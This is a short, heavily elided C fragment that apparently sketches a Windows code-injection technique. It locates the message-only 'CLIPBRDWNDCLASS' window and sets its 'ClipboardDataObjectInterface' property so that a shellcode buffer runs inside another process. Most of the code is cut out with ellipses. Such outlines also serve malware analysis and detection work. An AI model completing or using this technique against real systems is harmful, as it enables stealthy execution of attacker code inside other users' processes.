...
VOID clipboard(LPVOID payload, DWORD payloadSize)
{
	...
	hw = FindWindowEx(HWND_MESSAGE, NULL, "CLIPBRDWNDCLASS", NULL);
	...
	SetProp(hw, "ClipboardDataObjectInterface", ds);
...
int clipbrdwndclassExecute()
{
	...
	clipboard(shellCode, sizeof(shellCode));
	return 0;
}